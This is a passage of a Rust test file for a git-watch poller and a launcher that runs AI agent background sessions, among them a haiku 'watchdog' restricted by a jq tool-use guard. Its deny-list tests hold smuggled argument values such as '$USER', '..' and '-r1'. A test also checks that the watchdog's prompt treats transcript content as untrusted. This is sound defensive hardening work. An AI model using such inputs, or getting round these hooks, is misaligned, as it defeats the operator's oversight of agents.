    let env = [("PATH", path.as_str()), ("GIT_SPY_LOG", log.to_str().unwrap()), ("GIT_SPY_FAIL", "1"), ("LC_ALL", "en_US.UTF-8")];
    let mut s = w.armed_env(&["pushed", &tip, "wu/f"], "fetch-fails", &env);
    for n in 1..=3 {
        s.go(n);
    }
    s.at(4);
    git(&other, &["push", "-q", "origin", "--delete", "wu/f"]);
    s.go(4);
    s.at(5);
    git(&other, &["push", "-q", "origin", "HEAD:refs/heads/wu/f"]);
    for n in 5..=9 {
        s.go(n);
    }
    let dir = s.dir.clone();
    let out = s.line();
    assert_eq!(out, "UNREACHABLE kind=pushed remote=origin error=spy: last line\n", "the error is git's whole last line, an invalid byte as a space");
    let calls = std::fs::read_to_string(&log).unwrap();
    let fetches: Vec<&str> = calls.lines().filter(|l| l.contains(" fetch ")).collect();
    assert!(!fetches.is_empty() && fetches.iter().all(|l| ["--no-tags", "--no-write-fetch-head", "--no-auto-maintenance", "--no-recurse-submodules"].iter().all(|f| l.contains(f))), "{fetches:?}");
    let network: Vec<&str> = calls.lines().filter(|l| l.contains(" fetch ") || l.contains(" ls-remote ")).collect();
    assert!(network.iter().any(|l| l.contains(" ls-remote ")), "{calls}");
    assert!(network.iter().all(|l| l.contains("-c http.lowSpeedLimit=1 -c http.lowSpeedTime=120 ")), "a network call without the http stall bound: {network:?}");
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "9", "a missing branch did not reset the count");

    // review r5: tagged resets its count on a good ls-remote too (the tag is not there yet)
    let (good, bad) = (w.base.join("origin.git"), w.base.join("missing.git"));
    git(&w.main, &["remote", "set-url", "origin", bad.to_str().unwrap()]);
    let mut s = w.armed(&["tagged", "v9"], "tagged-reset");
    for n in 1..=3 {
        s.go(n);
    }
    s.at(4);
    git(&w.main, &["remote", "set-url", "origin", good.to_str().unwrap()]);
    s.go(4);
    s.at(5);
    git(&w.main, &["remote", "set-url", "origin", bad.to_str().unwrap()]);
    for n in 5..=9 {
        s.go(n);
    }
    let dir = s.dir.clone();
    let out = s.line();
    assert!(out.starts_with("UNREACHABLE kind=tagged "), "{out}");
    assert_eq!(std::fs::read_to_string(dir.join("polls")).unwrap().trim(), "9", "tagged did not reset the count on success");
}

/// E-SEED2.W12 review r5: by default a watch polls every 15 s and gives up with TIMEOUT once 6600 s
/// (110 min) have passed, reported in whole minutes; the clock is the `date` shim.
#[test]
fn watch_polls_at_its_default_pace_and_times_out_in_minutes() {
    let w = watcher();
    let t = w.sha("HEAD");
    let dir = w.base.join("steps-pace");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("now"), "1000").unwrap();
    let mut s = w.armed(&["signed", &t], "pace");
    s.at(1);
    std::fs::write(dir.join("now"), "7599").unwrap();
    s.go(1);
    s.at(2);
    std::fs::write(dir.join("now"), "7600").unwrap();
    s.go(2);
    assert_eq!(s.line(), "TIMEOUT kind=signed waited=110m\n");
    assert_eq!(std::fs::read_to_string(dir.join("sleeps")).unwrap(), "15\n15\n");

    // the defaults hold whatever the test process exported: the knobs reach the watch only via `env`
    let (c, _) = w.cmd(&["signed", &t], "knobs", &[]);
    let removed: Vec<&std::ffi::OsStr> = c.get_envs().filter(|(_, v)| v.is_none()).map(|(k, _)| k).collect();
    assert!(["ROUTER_WATCH_POLL", "ROUTER_WATCH_MAX"].iter().all(|k| removed.contains(&std::ffi::OsStr::new(k))), "{removed:?}");
}

// ---- E-ROUTER3.W9: the watchdog (DEC-45) ----

/// The watchdog's two tool calls as Claude Code 2.1.288 delivered them to the session's own
/// PreToolUse hook (W9 probes P2/P3; ids and paths replaced, recipient renamed r1).
const CAPTURED_WATCHDOG_CRON: &str = r#"{"cwd":"/r","scratchpad_dir":"/t","prompt_id":"p","permission_mode":"default","agent_type":"watchdog","hook_event_name":"PreToolUse","tool_name":"CronCreate","tool_input":{"cron":"*/5 * * * *","prompt":"tick","recurring":true},"tool_use_id":"u1"}"#;
const CAPTURED_WATCHDOG_SEND: &str = r#"{"cwd":"/r","scratchpad_dir":"/t","prompt_id":"p","permission_mode":"default","agent_type":"watchdog","hook_event_name":"PreToolUse","tool_name":"SendMessage","tool_input":{"to":"r1","summary":"FACTSMARK-185209","message":"FACTSMARK-185209\nSendMessage, CronCreate","type":"message","recipient":"r1","content":"FACTSMARK-185209\nSendMessage, CronCreate"},"tool_use_id":"u2"}"#;

const WATCHDOG_POLICY: &str = "[router]\nworker_model = \"opus\"\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\nwatchdog_model = \"haiku\"\n";

/// The guard run as the watchdog session's hook runs it: with `--arg watchdog_to <to>`.
fn guard_to(to: &str, event: &serde_json::Value) -> Option<String> {
    let mut p = Command::new("jq")
        .args(["-c", "--arg", "watchdog_to", to, "-f"])
        .arg(root().join("scripts/router-guard.jq"))
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .spawn()
        .unwrap();
    std::io::Write::write_all(&mut p.stdin.take().unwrap(), event.to_string().as_bytes()).unwrap();
    decision(event, p.wait_with_output().unwrap())
}

#[test]
fn router_guard_admits_the_two_watchdog_shapes_in_plain_words_only() {
    for ok in [
        "scripts/router-worker.sh watchdog start r1",
        "scripts/router-worker.sh watchdog stop r1",
        "scripts/router-worker.sh watchdog start keel-e-router3-63",
    ] {
        assert_eq!(bash(ok), None, "guard denied {ok:?}");
    }
    let long = format!("scripts/router-worker.sh watchdog start {}", "a".repeat(33));
    for no in [
        "scripts/router-worker.sh watchdog",
        "scripts/router-worker.sh watchdog start",
        "scripts/router-worker.sh watchdog stop",
        "scripts/router-worker.sh watchdog start r1 r2",
        "scripts/router-worker.sh watchdog start R1",
        "scripts/router-worker.sh watchdog start r.1",
        "scripts/router-worker.sh watchdog start ..",
        "scripts/router-worker.sh watchdog start -r1",
        "scripts/router-worker.sh watchdog start \"r1\"",
        "scripts/router-worker.sh watchdog start $USER",
        "scripts/router-worker.sh watchdog facts r1",
        "scripts/router-worker.sh watchdog restart r1",
        "scripts/router-worker.sh watchdogx start r1",
        long.as_str(),
    ] {
        assert!(bash(no).is_some(), "guard allowed {no:?}");
    }
    assert!(bash("scripts/router-worker.sh watchdog facts r1")
        .unwrap()
        .contains("watchdog start|stop <router-name>"));
}

#[test]
fn guard_run_with_a_watchdog_recipient_allows_only_the_scheduler_and_a_message_to_that_name() {
    let cron: serde_json::Value = serde_json::from_str(CAPTURED_WATCHDOG_CRON).unwrap();
    let send: serde_json::Value = serde_json::from_str(CAPTURED_WATCHDOG_SEND).unwrap();
    for agent in [Some("watchdog"), Some("router"), None] {
        let as_agent = |mut e: serde_json::Value| {
            match agent {
                Some(a) => e["agent_type"] = a.into(),
                None => {
                    e.as_object_mut().unwrap().remove("agent_type");
                }
            }
            e
        };
        assert_eq!(
            guard_to("r1", &as_agent(cron.clone())),
            None,
            "{agent:?}: CronCreate"
        );
        assert_eq!(
            guard_to("r1", &as_agent(send.clone())),
            None,
            "{agent:?}: SendMessage to r1"
        );
        let mut other = send.clone();
        other["tool_input"]["to"] = "w1".into();
        let mut missing = send.clone();
        missing["tool_input"].as_object_mut().unwrap().remove("to");
        let mut number = send.clone();
        number["tool_input"]["to"] = 1.into();
        let mut recipient_only = send.clone();
        recipient_only["tool_input"]["to"] = "w1".into();
        recipient_only["tool_input"]["recipient"] = "r1".into();
        for (what, e) in [
            ("another to", other),
            ("no to", missing),
            ("non-string to", number),
            ("to w1, recipient r1", recipient_only),
        ] {
            let why =
                guard_to("r1", &as_agent(e)).unwrap_or_else(|| panic!("{agent:?}: {what} allowed"));
            assert!(why.contains("watchdog guard"), "{why}");
        }
        for (tool, input) in [
            ("Bash", serde_json::json!({"command": "git status"})),
            ("Read", serde_json::json!({"file_path": "/r/x"})),
            (
                "Write",
                serde_json::json!({"file_path": "/r/.router/briefs/x.md"}),
            ),
            ("Agent", serde_json::json!({"prompt": "x"})),
            ("CronDelete", serde_json::json!({"id": "x"})),
        ] {
            let mut e = cron.clone();
            e["tool_name"] = tool.into();
            e["tool_input"] = input;
            assert!(
                guard_to("r1", &as_agent(e)).is_some(),
                "{agent:?}: {tool} allowed"
            );
        }
        assert!(
            guard_to("", &as_agent(cron.clone())).is_some(),
            "{agent:?}: an empty recipient allowed CronCreate"
        );
        assert!(
            guard_to("", &as_agent(send.clone())).is_some(),
            "{agent:?}: an empty recipient allowed a message"
        );
        // review r2 I1: only the one schedule the start prompt asks for; transcript text cannot add another
        for (k, v) in [
            ("cron", serde_json::json!("* * * * *")),
            ("cron", serde_json::json!("*/1 * * * *")),
            ("prompt", serde_json::json!("tick and message w1")),
            ("recurring", serde_json::json!(false)),
            ("recurring", serde_json::Value::Null),
        ] {
            let mut e = cron.clone();
            e["tool_input"][k] = v.clone();
            assert!(guard_to("r1", &as_agent(e)).is_some(), "{agent:?}: CronCreate with {k} = {v} allowed");
        }
    }
}

/// A launcher whose committed policy names a watchdog model and whose session list holds the router
/// r1, a background session in the router checkout.
fn watchdog_launcher() -> Launcher {
    let l = launcher();
    l.commit_config(Some(WATCHDOG_POLICY));
    l.set_sessions(&[serde_json::json!({"id": "r100", "sessionId": "r100-x", "name": "r1", "cwd": l.main, "kind": "background", "status": "idle"})]);
    l
}

/// The argv of the watchdog session the stub started for `router`, checked option by option.
fn watchdog_argv(state: &Path, router: &str) -> (String, Vec<String>) {
    let name = format!("watchdog-{router}");
    let (dir, a) = calls(state)
        .into_iter()
        .rfind(|(_, a)| a[0] == "--bg" && a.windows(2).any(|w| w[0] == "-n" && w[1] == name))
        .unwrap_or_else(|| panic!("no session started for {name}"));
    let flags: Vec<&str> = a
        .iter()
        .map(String::as_str)
        .filter(|x| x.starts_with('-'))
        .collect();
    assert_eq!(
        flags,
        [
            "--bg",
            "-n",
            "--setting-sources",
            "--agents",
            "--agent",
            "--model",
            "--tools",
            "--allowedTools",
            "--strict-mcp-config",
            "--autocompact",
            "--settings"
        ],
        "options in {a:?}"
    );
    assert_eq!(option(&a, "-n"), name);
    assert_eq!(option(&a, "--setting-sources"), "local");
    assert_eq!(option(&a, "--agent"), "watchdog");
    assert_eq!(option(&a, "--model"), "haiku");
    assert_eq!(option(&a, "--autocompact"), "100k");
    let list = |flag: &str| -> Vec<String> {
        let i = a.iter().position(|x| x == flag).unwrap();
        a[i + 1..]
            .iter()
            .take_while(|x| !x.starts_with('-'))
            .cloned()
            .collect()
    };
    assert_eq!(list("--tools"), ["SendMessage", "CronCreate"]);
    assert_eq!(list("--allowedTools"), ["SendMessage", "CronCreate"]);
    assert_eq!(
        a[a.len() - 3],
        "--settings",
        "the prompt must follow --settings' value: {a:?}"
    );
    assert!(a[a.len() - 1].contains("*/5 * * * *"), "{a:?}");
    (dir, a)
}

#[test]
fn watchdog_session_loads_local_settings_only_and_defines_its_agent_inline() {
    let l = watchdog_launcher();
    let (ok, out) = l.run(&["watchdog", "start", "r1"]);
    assert!(ok, "{out}");
    let (_, a) = watchdog_argv(&l.state, "r1");
    let agents: serde_json::Value = serde_json::from_str(&option(&a, "--agents")).unwrap();
    let obj = agents.as_object().unwrap();
    assert_eq!(obj.keys().collect::<Vec<_>>(), ["watchdog"]);
    let w = &agents["watchdog"];
    assert!(
        !w["description"].as_str().unwrap().is_empty() && !w["prompt"].as_str().unwrap().is_empty(),
        "{w}"
    );
    assert_eq!(w["tools"], serde_json::json!(["SendMessage", "CronCreate"]));
    assert!(w["prompt"].as_str().unwrap().contains("untrusted"), "{w}");
    assert!(!root().join(".claude/agents/watchdog.md").exists());
}

/// The two hook commands the watchdog's `--settings` carries.
fn watchdog_hooks(a: &[String]) -> (String, String) {
    let s: serde_json::Value = serde_json::from_str(&option(a, "--settings")).unwrap();
    let one = |ev: &str| {
        let h = s["hooks"][ev].as_array().unwrap();
        assert_eq!(h.len(), 1, "{ev}: {s}");
        assert_eq!(h[0]["hooks"].as_array().unwrap().len(), 1, "{ev}: {s}");
        h[0]["hooks"][0]["command"].as_str().unwrap().to_string()
    };
    assert_eq!(s["hooks"].as_object().unwrap().len(), 2, "{s}");
    assert_eq!(
        s["hooks"]["PreToolUse"][0]
            .get("matcher")
            .and_then(|m| m.as_str())
            .unwrap_or("*"),
        "*"
    );
    (one("UserPromptSubmit"), one("PreToolUse"))
}

/// Run a hook command as Claude Code would in a background session: no variable of the launcher's
/// environment (W10 P8), ROUTER_CLAUDE included (review r1 B1), only PATH, HOME and the stub's state dir.
fn run_hook(l: &Launcher, cmd: &str, path: &str, home: &Path, stdin: &str) -> Output {
    let mut p = common::cmd("/bin/sh")
        .args(["-c", cmd])
        .current_dir(&l.main)
        .env_clear()
        .env("PATH", path)
        .env("HOME", home)
        .env("STUB_STATE", &l.state)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    std::io::Write::write_all(&mut p.stdin.take().unwrap(), stdin.as_bytes()).unwrap();
    p.wait_with_output().unwrap()
}

#[test]
fn watchdog_starts_as_a_background_session_whose_hooks_carry_the_routers_name() {
    let l = watchdog_launcher();
    let (ok, out) = l.run(&["watchdog", "start", "r1"]);
    assert!(ok, "{out}");
    let row = l
        .sessions()
        .into_iter()
        .find(|r| r["name"] == "watchdog-r1")
        .unwrap();
    assert_eq!(
        out,
        format!(
            "RUNNING name=watchdog-r1 id={} session={} router=r1 model=haiku every=5m\n",
            row["id"].as_str().unwrap(),
            row["sessionId"].as_str().unwrap()
        )
    );
    let (dir, a) = watchdog_argv(&l.state, "r1");
    assert_eq!(
        dir,
        l.main.to_str().unwrap(),
        "started outside the router checkout"
    );
    for no in [
        "-p",
        "--print",
        "--resume",
        "--session-id",
        "--effort",
        "--permission-mode",
        "--disallowedTools",
    ] {
        assert!(!a.iter().any(|x| x == no), "{no} in {a:?}");
    }
    assert!(
        !a.iter().any(|x| x.starts_with("Bash(")),
        "a worker grant reached the watchdog: {a:?}"
    );

    let (prompt_hook, tool_hook) = watchdog_hooks(&a);
    for c in [&prompt_hook, &tool_hook] {
        assert!(!c.contains('$'), "a hook reads the environment: {c}");
    }
    let home = TempDir::new().unwrap();
    let path = std::env::var("PATH").unwrap();
    let o = run_hook(
        &l,
        &prompt_hook,
        &path,
        home.path(),
        "{\"prompt\":\"tick\"}",
    );
    assert!(o.status.success(), "{o:?}");
    // review r1 B1: with no ROUTER_CLAUDE and no claude under HOME, the hook still reads the session list
    assert_eq!(String::from_utf8_lossy(&o.stdout), "Report to r1.\nNo live worker.\n", "{o:?}");

    let verdict = |o: Output| -> Option<String> { decision(&serde_json::json!({}), o) };
    assert_eq!(
        verdict(run_hook(
            &l,
            &tool_hook,
            &path,
            home.path(),
            CAPTURED_WATCHDOG_SEND
        )),
        None
    );
    assert_eq!(
        verdict(run_hook(
            &l,
            &tool_hook,
            &path,
            home.path(),
            CAPTURED_WATCHDOG_CRON
        )),
        None
    );
    assert!(verdict(run_hook(
        &l,
        &tool_hook,
        &path,
        home.path(),
        &CAPTURED_WATCHDOG_SEND.replace("\"to\":\"r1\"", "\"to\":\"w1\"")
    ))
    .is_some());
    // it is the session's only tool hook: a guard that cannot run or parse denies
    assert_eq!(
        run_hook(
            &l,
            &tool_hook,
            "/nonexistent",
            home.path(),
            CAPTURED_WATCHDOG_SEND
        )
        .status
        .code(),
        Some(2),
        "jq missing"
    );
    assert_eq!(
        run_hook(&l, &tool_hook, &path, home.path(), "not json")
            .status
            .code(),
        Some(2),
        "payload not JSON"
    );

    // a start the CLI refuses is reported dead
    let l = watchdog_launcher();
    std::fs::write(l.state.join("refuse"), "Error: not logged in\n").unwrap();
    let (ok, out) = l.run(&["watchdog", "start", "r1"]);
    assert!(
        !ok && out.starts_with("DEAD name=watchdog-r1 exit=1")
            && out.contains("Error: not logged in"),
        "{out}"
    );
}

#[test]
fn watchdog_start_refuses_a_bad_name_an_unlisted_router_and_a_second_start() {
    let l = watchdog_launcher();
    let path = l.fast_path();
    let long = "a".repeat(33);
    for (args, why) in [
        (vec!["watchdog", "start", "R1"], "bad router name"),
        (vec!["watchdog", "start", long.as_str()], "bad router name"),
        (
            vec!["watchdog", "start"],
            "watchdog start|stop <router-name>",
        ),
        (
            vec!["watchdog", "restart", "r1"],
            "watchdog start|stop <router-name>",
        ),
        (vec!["watchdog", "start", "r2"], "router r2 is not listed"),
        (
            vec!["watchdog", "stop", "r1"],
            "worker watchdog-r1 is not running",
        ),
        (
            vec![
                "spawn",
                "watchdog",
                l.wt.to_str().unwrap(),
                ".router/briefs/b.md",
                "opus",
            ],
            "the name watchdog is reserved",
        ),
        (
            vec![
                "spawn",
                "watchdog-x",
                l.wt.to_str().unwrap(),
                ".router/briefs/b.md",
                "opus",
            ],
            "the name watchdog-x is reserved",
        ),
    ] {
        let (ok, out) = l.run_env(&args, &[("PATH", &path)]);
        assert!(!ok && out.contains(why), "{args:?}: {out}");
    }
    assert_eq!(l.starts("watchdog-r1") + l.starts("watchdog-r2"), 0);
    assert!(l.run(&["watchdog", "start", "r1"]).0);
    let (ok, out) = l.run(&["watchdog", "start", "r1"]);
    assert!(
        !ok && out.contains("watchdog-r1 is already running"),
        "{out}"
    );
    assert_eq!(l.starts("watchdog-r1"), 1);
    std::fs::write(l.state.join("agents-ok"), "0").unwrap();
    let (ok, out) = l.run(&["watchdog", "start", "r1"]);
    assert!(
        !ok && out.contains("cannot list sessions (claude agents --json)"),
        "{out}"
    );
    std::fs::remove_file(l.state.join("agents-ok")).unwrap();
    // no watchdog model in the committed policy: workers still spawn, the watchdog does not start
    let l = watchdog_launcher();
    l.commit_config(Some(
        &WATCHDOG_POLICY.replace("watchdog_model = \"haiku\"\n", ""),
    ));
    let (ok, out) = l.run(&["watchdog", "start", "r1"]);
    assert!(
        !ok && out.contains("no watchdog model: [router] watchdog_model"),
        "{out}"
    );
    assert!(
        l.run(&[
            "spawn",
            "w1",
            l.wt.to_str().unwrap(),
            ".router/briefs/b.md",
            "opus"
        ])
        .0
    );
}

#[test]
fn worker_policy_reads_an_optional_watchdog_model() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let base = WATCHDOG_POLICY.replace("watchdog_model = \"haiku\"\n", "");
    for (config, spawns, watchdog) in [
        (WATCHDOG_POLICY.to_string(), true, true),
        (base.clone(), true, false),
        (
            format!("{WATCHDOG_POLICY}watchdog_model = \"opus\"\n"),
            false,
            false,
        ),
        (format!("{base}watchdog_model = haiku\n"), false, false),
        (format!("{base}watchdog_model = \"Haiku\"\n"), false, false),
        (
            format!("{base}\n[router]\nwatchdog_model = \"haiku\"\n"),
            false,
            false,
        ),
    ] {
        l.commit_config(Some(&config));
        l.set_sessions(&[serde_json::json!({"id": "r100", "sessionId": "r100-x", "name": "r1", "cwd": l.main, "kind": "background", "status": "idle"})]);
        let (ok, out) = l.run(&["spawn", "w1", wt, ".router/briefs/b.md", "opus"]);
        assert_eq!(ok, spawns, "{config}: {out}");
        let (ok, out) = l.run(&["watchdog", "start", "r1"]);
        assert_eq!(ok, watchdog, "{config}: {out}");
        if !spawns {
            assert!(out.contains("no worker policy"), "{config}: {out}");
        }
    }
}

/// A worker row of this repository and its transcript under `home`, written `quiet_min` minutes ago.
fn worker_row(
    l: &Launcher,
    home: &Path,
    name: &str,
    sid: &str,
    status: serde_json::Value,
    quiet_min: Option<u64>,
    lines: &[String],
) -> serde_json::Value {
    if let Some(q) = quiet_min {
        let dir = home.join(".claude/projects/-p");
        std::fs::create_dir_all(&dir).unwrap();
        let t = dir.join(format!("{sid}.jsonl"));
        std::fs::write(&t, lines.join("\n") + "\n").unwrap();
        let f = std::fs::File::options().write(true).open(&t).unwrap();
        f.set_modified(std::time::SystemTime::now() - Duration::from_secs(q * 60))
            .unwrap();
    }
    let mut r = serde_json::json!({"id": &sid[..8], "sessionId": sid, "name": name, "cwd": l.wt, "kind": "background"});
    for (k, v) in status.as_object().unwrap() {
        r[k] = v.clone();
    }
    r
}

fn assistant(items: serde_json::Value) -> String {
    serde_json::json!({"type": "assistant", "message": {"role": "assistant", "content": items}})
        .to_string()
}

fn facts(l: &Launcher, home: &Path) -> String {
    let (ok, out) = l.run_env(
        &["watchdog", "facts", "r1"],
        &[("HOME", home.to_str().unwrap())],
    );
    assert!(ok, "{out}");
    out
}

/// The blocks of a facts output: a block starts at a worker's line (it carries " · quiet ") and runs
/// over its item lines.
fn blocks(out: &str) -> Vec<String> {
    let mut b: Vec<String> = Vec::new();
    for line in out.lines().skip(1) {
        if line.starts_with("  - ") {
            let last = b.last_mut().unwrap();
            last.push('\n');
            last.push_str(line);
        } else if line.contains(" · quiet ") {
            b.push(line.to_string());
        }
    }
    b
}

fn sid(n: u64) -> String {
    format!("{n:08x}-0000-4000-8000-000000000000")
}

#[test]
fn watchdog_facts_hold_one_block_per_live_worker_of_this_repository() {
    let l = watchdog_launcher();
    let home = TempDir::new().unwrap();
    let h = home.path();
    assert_eq!(facts(&l, h), "Report to r1.\nNo live worker.\n");
    let mut rows = l.sessions();
    rows.push(worker_row(
        &l,
        h,
        "w1",
        &sid(1),
        serde_json::json!({"status": "busy"}),
        Some(1),
        &[assistant(
            serde_json::json!([{"type": "text", "text": "working on it"}]),
        )],
    ));
    let mut w2 = worker_row(
        &l,
        h,
        "w2",
        &sid(2),
        serde_json::json!({"status": "busy"}),
        Some(2),
        &[],
    );
    w2["cwd"] = l.wt2.to_str().unwrap().into();
    rows.push(w2);
    rows.push(serde_json::json!({"id": "f0", "sessionId": sid(3), "name": "foreign", "cwd": "/elsewhere", "kind": "background", "status": "idle"}));
    rows.push(serde_json::json!({"id": "i0", "sessionId": sid(4), "name": "inter", "cwd": l.wt, "kind": "interactive", "status": "idle"}));
    rows.push(serde_json::json!({"id": "wd0", "sessionId": sid(5), "name": "watchdog-r1", "cwd": l.main, "kind": "background", "status": "busy"}));
    // review r1 I2: another router's watchdog, in a sibling worktree, is no worker
    rows.push(serde_json::json!({"id": "wd1", "sessionId": sid(6), "name": "watchdog-r2", "cwd": l.wt2, "kind": "background", "status": "idle"}));
    l.set_sessions(&rows);
    let out = facts(&l, h);
    assert!(out.starts_with("Report to r1.\n"), "{out}");
    let b = blocks(&out);
    assert_eq!(b.len(), 2, "{out}");
    assert!(
        b[0].starts_with("w1: busy")
            && b[0].contains("  - working on it")
            && b[1].starts_with("w2: busy"),
        "{out}"
    );
    assert!(
        b[0].contains(" · w · ") && b[1].contains(" · w2 · "),
        "branch missing: {out}"
    );
    rows.retain(|r| r["name"] != "w2");
    l.set_sessions(&rows);
    assert_eq!(blocks(&facts(&l, h)).len(), 1);
}

#[test]
fn watchdog_facts_mark_an_idle_worker_done_and_a_blocked_or_quiet_one_stuck() {
    let l = watchdog_launcher();
    let home = TempDir::new().unwrap();
    let h = home.path();
    let mut rows = l.sessions();
    for (name, n, status, quiet) in [
        (
            "busy14",
            1,
            serde_json::json!({"status": "busy", "state": "working"}),
            14,
        ),
        (
            "busy16",
            2,
            serde_json::json!({"status": "busy", "state": "working"}),
            16,
        ),
        (
            "idle",
            3,
            serde_json::json!({"status": "idle", "state": "done"}),
            40,
        ),
        (
            "prompt",
            4,
            serde_json::json!({"status": "waiting", "waitingFor": "permission prompt", "state": "blocked"}),
            0,
        ),
        ("blocked", 5, serde_json::json!({"state": "blocked"}), 0),
        ("working", 6, serde_json::json!({"state": "working"}), 1),
    ] {
        rows.push(worker_row(&l, h, name, &sid(n), status, Some(quiet), &[]));
    }
    l.set_sessions(&rows);
    let out = facts(&l, h);
    let state = |name: &str| -> String {
        let b = blocks(&out)
            .into_iter()
            .find(|b| b.starts_with(&format!("{name}: ")))
            .unwrap_or_else(|| panic!("no {name} in {out}"));
        b[name.len() + 2..].split(" · ").next().unwrap().to_string()
    };
    assert_eq!(state("busy14"), "busy");
    assert_eq!(state("busy16"), "STUCK (quiet 16m)");
    assert_eq!(state("idle"), "DONE");
    assert_eq!(state("prompt"), "STUCK (permission prompt)");
    assert_eq!(state("blocked"), "STUCK (blocked)");
    assert_eq!(state("working"), "busy");
    // done and stuck first, busy last, in list order within each
    let order: Vec<String> = blocks(&out)
        .iter()
        .map(|b| b.split(':').next().unwrap().to_string())
        .collect();
    assert_eq!(
        order,
        ["busy16", "idle", "prompt", "blocked", "busy14", "working"],
        "{out}"
    );
}

#[test]
fn watchdog_ends_on_stop_and_when_the_router_is_gone() {
    let l = watchdog_launcher();
    let home = TempDir::new().unwrap();
    assert!(
        l.run(&[
            "spawn",
            "w1",
            l.wt.to_str().unwrap(),
            ".router/briefs/b.md",
            "opus"
        ])
        .0
    );
    assert!(l.run(&["watchdog", "start", "r1"]).0);
    let id = |n: &str| {
        l.sessions().iter().find(|r| r["name"] == n).unwrap()["id"]
            .as_str()
            .unwrap()
            .to_string()
    };
    let (w1, wd) = (id("w1"), id("watchdog-r1"));
    let cli = |from: usize| -> Vec<Vec<String>> {
        calls(&l.state)[from..]
            .iter()
            .map(|(_, a)| a.clone())
            .filter(|a| a[0] == "stop" || a[0] == "rm")
            .collect()
    };

    let n0 = calls(&l.state).len();
    let (ok, out) = l.run(&["watchdog", "stop", "r1"]);
    assert!(
        ok && out.starts_with(&format!("STOPPED name=watchdog-r1 id={wd} ")),
        "{out}"
    );
    assert_eq!(
        cli(n0),
        [
            vec!["stop".to_string(), wd.clone()],
            vec!["rm".to_string(), wd]
        ]
    );

    // the router leaves: the next facts run stops the watchdog, and only it
    assert!(l.run(&["watchdog", "start", "r1"]).0);
    let wd = id("watchdog-r1");
    let rows: Vec<serde_json::Value> = l
        .sessions()
        .into_iter()
        .filter(|r| r["name"] != "r1")
        .collect();
    l.set_sessions(&rows);
    let n0 = calls(&l.state).len();
    let out = facts(&l, home.path());
    assert_eq!(cli(n0), [vec!["stop".to_string(), wd]]);
    assert!(blocks(&out).is_empty() && !out.contains("w1"), "{out}");
    assert!(l.sessions().iter().any(|r| r["id"] == w1.as_str()));

    // an unreadable list stops nothing
    std::fs::write(l.state.join("agents-ok"), "0").unwrap();
    let n0 = calls(&l.state).len();
    let out = facts(&l, home.path());
    assert!(out.contains("cannot be read"), "{out}");
    assert!(cli(n0).is_empty());
}

/// A deterministic generator (no crate): xorshift64.
struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 << 13;
        self.0 ^= self.0 >> 7;
        self.0 ^= self.0 << 17;
        self.0
    }
    fn text(&mut self, max: usize) -> String {
        const ALPHABET: [&str; 12] = [
            "a", "Z", " ", "\"", "\\", "\n", "\t", "\u{1}", "\u{7f}", "\u{85}", "漢", "é",
        ];
        (0..(self.next() as usize % max))
            .map(|_| ALPHABET[self.next() as usize % ALPHABET.len()])
            .collect()
    }
}

#[test]
fn fact_block_states_a_worker_from_its_transcript_tail_within_its_bound() {
    let l = watchdog_launcher();
    let home = TempDir::new().unwrap();
    let h = home.path();
    let mut rows = l.sessions();
    // the last six items in order; a tool item; non-JSON skipped; thinking skipped
    let mut lines: Vec<String> = (1..=8)
        .map(|i| assistant(serde_json::json!([{"type": "text", "text": format!("step {i}")}])))
        .collect();
    lines.push("not json".into());
    lines.push(assistant(serde_json::json!([{"type": "thinking", "thinking": "secret"}, {"type": "tool_use", "name": "Bash", "input": {"command": "cargo test"}}])));
    lines.push(
        serde_json::json!({"type": "user", "message": {"role": "user", "content": "do it"}})
            .to_string(),
    );
    rows.push(worker_row(
        &l,
        h,
        "w1",
        &sid(1),
        serde_json::json!({"status": "busy"}),
        Some(0),
        &lines,
    ));
    // a transcript longer than the 64 KB window: its cut first line is ignored
    let big = "x".repeat(70_000);
    rows.push(worker_row(
        &l,
        h,
        "w2",
        &sid(2),
        serde_json::json!({"status": "busy"}),
        Some(0),
        &[
            assistant(serde_json::json!([{"type": "text", "text": big}])),
            assistant(serde_json::json!([{"type": "text", "text": "after the big one"}])),
        ],
    ));
    // a quiet transcript whose subagent wrote lately: not quiet
    rows.push(worker_row(
        &l,
        h,
        "w3",
        &sid(3),
        serde_json::json!({"status": "busy"}),
        Some(30),
        &[],
    ));
    let sub = h.join(format!(".claude/projects/-p/{}/subagents", sid(3)));
    std::fs::create_dir_all(&sub).unwrap();
    std::fs::write(sub.join("agent-1.jsonl"), "{}\n").unwrap();
    // no transcript at all
    rows.push(worker_row(
        &l,
        h,
        "w4",
        &sid(4),
        serde_json::json!({"status": "busy"}),
        None,
        &[],
    ));
    l.set_sessions(&rows);
    let out = facts(&l, h);
    let block = |n: &str| {
        blocks(&out)
            .into_iter()
            .find(|b| b.starts_with(&format!("{n}: ")))
            .unwrap_or_else(|| panic!("no {n} in {out}"))
    };
    let items: Vec<String> = block("w1").lines().skip(1).map(String::from).collect();
    assert_eq!(
        items,
        [
            "  - step 4",
            "  - step 5",
            "  - step 6",
            "  - step 7",
            "  - step 8",
            "  - tool Bash: {\"command\":\"cargo test\"}"
        ],
        "{out}"
    );
    assert!(
        !out.contains("secret") && !out.contains("not json"),
        "{out}"
    );
    assert_eq!(
        block("w2").lines().skip(1).collect::<Vec<_>>(),
        ["  - after the big one"],
        "{out}"
    );
    assert!(block("w3").starts_with("w3: busy · quiet 0m"), "{out}");
    let w4 = block("w4");
    assert!(
        w4.starts_with("w4: busy · quiet ?") && w4.lines().count() == 1,
        "{out}"
    );

    // invariant: whatever the transcript and the row hold, a block is at most 2000 bytes and holds
    // no control character but its line breaks
    let mut rng = Rng(0x9e37_79b9_7f4a_7c15);
    for case in 0..12 {
        let lines: Vec<String> = (0..rng.next() % 12)
            .map(|_| match rng.next() % 3 {
                0 => assistant(serde_json::json!([{"type": "text", "text": rng.text(600)}])),
                1 => assistant(serde_json::json!([{"type": "tool_use", "name": rng.text(40), "input": {"command": rng.text(600)}}])),
                _ => rng.text(200),
            })
            .collect();
        let status = serde_json::json!({"status": "waiting", "waitingFor": rng.text(300)});
        let mut rows = l
            .sessions()
